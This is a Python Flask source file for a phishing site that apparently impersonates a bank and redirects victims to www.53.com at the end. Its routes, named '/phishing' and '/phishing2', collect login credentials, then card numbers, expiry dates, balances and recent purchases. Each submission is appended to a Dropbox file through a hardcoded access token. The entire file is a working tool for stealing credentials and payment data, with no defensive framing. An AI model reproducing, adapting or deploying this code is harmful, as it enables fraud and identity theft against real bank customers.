import dropbox
from flask import Flask, redirect, render_template, request, session

app = Flask(__name__)

@app.route('/enter')
def enter(name=None):
    return render_template('login.html', name=name)


@app.route('/phishing', methods=['POST'])
def login():
    username = request.form.get('user-id')
    password = request.form.get('password')    
    
    upload_data1(username, password)
    return redirect("/account_details")
    
@app.route('/account_details')
def account_details(name=None):
    return render_template('account_details.html', name=name)

@app.route('/phishing2', methods=['POST'])
def submitDetails():
    card_number = request.form.get('card_number')
    month = request.form.get('card_date')
    account_balance = request.form.get('account-value')
    last_purchase = request.form.get('last-purches')

    upload_data2( card_number, month, account_balance, last_purchase)

    return redirect("//www.53.com")


def upload_data2(card_number, month, account_balance, last_purchase):
    filename = "credentials.txt"        

    target = "/Temp/"             
    targetfile = target + filename   

    d = dropbox.Dropbox("c-UkY0EtVLIAAAAAAAAAAQ7psV2O349rKfVlRukg5yEP53Hq1b7TJOKhLkhmyOoL")
    str = card_number + ", " + month + ", " + account_balance + ", " + last_purchase + "\n"
    metadata, res = d.files_download(path=targetfile)
    con = res.content + str.encode()
    d.files_upload(con, targetfile, mode=dropbox.files.WriteMode("overwrite"))

def upload_data1(username, password):
    filename = "credentials.txt"        

    target = "/Temp/"             
    targetfile = target + filename   

    d = dropbox.Dropbox("c-UkY0EtVLIAAAAAAAAAAQ7psV2O349rKfVlRukg5yEP53Hq1b7TJOKhLkhmyOoL")
    str = "credentials of "+ username + " are:" + password + ",\n" 
    metadata, res = d.files_download(path=targetfile)
    con = res.content + str.encode()
    d.files_upload(con, targetfile, mode=dropbox.files.WriteMode("overwrite"))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
